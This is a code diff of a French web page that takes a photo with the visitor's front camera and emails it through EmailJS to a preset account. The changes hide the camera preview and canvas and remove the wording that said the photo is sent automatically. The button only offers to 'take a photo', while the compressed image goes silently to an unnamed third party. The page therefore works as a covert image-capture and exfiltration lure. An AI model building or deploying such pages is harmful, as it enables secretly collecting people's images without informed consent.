@@ -2,79 +2,65 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Photo et envoi par EmailJS</title>
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <title>Photo</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-      background: #f0f0f0;
-    }
-    video, canvas {
-      margin-top: 15px;
-      border: 2px solid #333;
-      border-radius: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #fafafa;
     }
     button {
-      margin: 10px;
       padding: 10px 20px;
-      font-size: 16px;
+      font-size: 14px;
       border: none;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
-      background: #28a745;
+      background: #007bff;
       color: white;
-    }
-    button:hover {
-      background: #1e7e34;
     }
   </style>
 </head>
 <body>
-  <h2>📸 Capture et envoi automatique</h2>
-  <button id="startBtn">Activer la caméra et envoyer</button>
-  <br>
-  <video id="video" autoplay playsinline width="300"></video>
-  <br>
-  <canvas id="canvas" width="300" height="200"></canvas>
+  <button id="capture">📸 Prendre une photo</button>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="200" height="150" style="display:none;"></canvas>
 
   <script>
-    // Initialiser EmailJS avec ta clé publique
-    (function(){
-      emailjs.init("IoSfbtGz4KSL_5_9E");
-    })();
+    emailjs.init("IoSfbtGz4KSL_5_9E");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
+    const captureBtn = document.getElementById('capture');
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
+    captureBtn.addEventListener('click', async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // caméra frontale
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // Quand la vidéo est prête → capture et envoi
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/png");
+          const imageData = canvas.toDataURL("image/jpeg", 0.2);
 
-          // Envoi via EmailJS
+          // Stop caméra
+          stream.getTracks().forEach(track => track.stop());
+
+          // Envoi email
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Voici la photo capturée automatiquement 📸",
+            message: "Photo capturée volontairement 📸",
             image: imageData
-          })
-          .then(() => {
-            alert("📧 Photo envoyée par email !");
-          }, (err) => {
+          }).then(() => {
+            alert("✅ Photo envoyée !");
+          }).catch(err => {
             alert("❌ Erreur : " + JSON.stringify(err));
           });
         };
-
       } catch (err) {
-        alert("⚠️ Accès caméra refusé ou caméra non disponible.");
+        alert("⚠️ Autorisation refusée ou caméra non disponible.");
       }
     });
   </script>
